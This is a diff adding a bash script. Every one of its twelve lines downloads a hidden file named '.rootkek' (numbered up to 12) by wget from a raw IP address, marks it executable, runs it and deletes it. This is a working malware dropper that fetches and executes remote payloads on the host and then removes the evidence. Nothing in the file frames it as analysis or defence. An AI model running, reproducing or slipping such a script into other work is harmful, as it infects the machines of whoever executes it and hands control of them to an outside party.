@@ -1,0 +1,13 @@
+#!/bin/bash
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek; chmod +x .rootkek; ./.rootkek; rm -rf .rootkek
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek2; chmod +x .rootkek2; ./.rootkek2; rm -rf .rootkek2
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek3; chmod +x .rootkek3; ./.rootkek3; rm -rf .rootkek3
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek4; chmod +x .rootkek4; ./.rootkek4; rm -rf .rootkek4
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek5; chmod +x .rootkek5; ./.rootkek5; rm -rf .rootkek5
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek6; chmod +x .rootkek6; ./.rootkek6; rm -rf .rootkek6
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek7; chmod +x .rootkek7; ./.rootkek7; rm -rf .rootkek7
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek8; chmod +x .rootkek8; ./.rootkek8; rm -rf .rootkek8
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek9; chmod +x .rootkek9; ./.rootkek9; rm -rf .rootkek9
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek10; chmod +x .rootkek10; ./.rootkek10; rm -rf .rootkek10
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek11; chmod +x .rootkek11; ./.rootkek11; rm -rf .rootkek11
+cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://87.121.98.34/.rootkek12; chmod +x .rootkek12; ./.rootkek12; rm -rf .rootkek12
